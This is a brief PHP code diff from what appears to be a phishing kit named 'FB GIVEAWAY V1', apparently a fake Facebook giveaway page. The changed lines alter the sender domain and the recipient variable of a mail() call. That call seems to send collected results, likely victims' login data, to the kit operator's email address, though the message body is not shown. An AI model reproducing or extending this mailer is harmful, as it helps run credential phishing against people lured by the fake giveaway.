@@ -33,8 +33,8 @@ $message = '
 include 'email.php';
 $headersx  = 'MIME-Version: 1.0' . "\r\n";
 $headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
-$headersx .= 'From: JEFANYA - FB GIVEAWAY V1 <result@jefanya.com>' . "\r\n";
-$datamail = mail($pulberaja, $subject, $message, $headersx);
+$headersx .= 'From: JEFANYA - FB GIVEAWAY V1 <result@jefanya.store>' . "\r\n";
+$datamail = mail($emailku, $subject, $message, $headersx);
 ?>
 <html>
 <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
